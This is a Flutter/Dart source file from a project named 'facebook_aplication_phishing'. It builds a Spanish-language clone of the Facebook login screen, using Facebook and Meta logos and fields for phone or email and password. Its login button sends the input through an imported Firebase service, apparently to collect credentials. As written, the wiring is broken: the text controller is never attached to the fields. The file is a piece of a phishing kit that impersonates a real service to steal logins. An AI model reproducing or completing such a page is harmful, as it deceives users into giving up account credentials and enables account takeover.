import 'package:facebook_aplication_phishing/services/firebase_service.dart';
import 'package:flutter/material.dart';

class HomePage extends StatefulWidget {
  const HomePage({Key? key}) : super(key: key);

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  TextEditingController datacontroller = TextEditingController(text: "");
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Column(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              Text("Español"),
              Divider(
                height: 30,
                color: Colors.transparent,
              ),
              SizedBox(
                  width: 60.0,
                  height: 60.0,
                  child: Image(image: AssetImage("assets/logo.png"))),
            ],
          ),

          ////////////////////PART N° 3///////////////////////
          Column(
            children: [
              Padding(
                padding: const EdgeInsets.all(10.0),
                child: TextField(
                    obscureText: true,
                    decoration: InputDecoration(
                        hintText: "Celular o correo electrónico",
                        border: OutlineInputBorder())),
              ),
              Padding(
                padding: const EdgeInsets.all(10.0),
                child: TextField(
                    obscureText: true,
                    decoration: InputDecoration(
                        hintText: "Contraseña", border: OutlineInputBorder())),
              ),
              ElevatedButton(
                  style: ElevatedButton.styleFrom(primary: Color(0xFFF1877f2)),
                  onPressed: () async {
                    await addData(datacontroller.text);
                    //Navigator.pop(context);
                  },
                  child: Container(
                    height: 50,
                    width: 350,
                    child: Center(child: Text("Iniciar sesión")),
                  ))
            ],
          ),
          //////////////////////////////fINISH PART 3////////////////
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              Text("¿Olvidaste tu contraseña?"),
              ElevatedButton(
                  child: SizedBox(
                    width: 350,
                    child: Center(
                      child: Text(
                        "Crear cuenta nueva",
                        style: TextStyle(color: Colors.black),
                      ),
                    ),
                  ),
                  onPressed: () {},
                  style: ElevatedButton.styleFrom(
                    elevation: 0.0,
                    primary: Colors.red.withOpacity(0),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.all(
                          Radius.circular(2),
                        ),
                        side: BorderSide(color: Colors.black26)),
                  )),
              Container(
                width: 80,
                height: 80,
                child: Image(image: AssetImage("assets/meta.png")),
              )
            ],
          ),
        ],
      ),
    );
  }
}
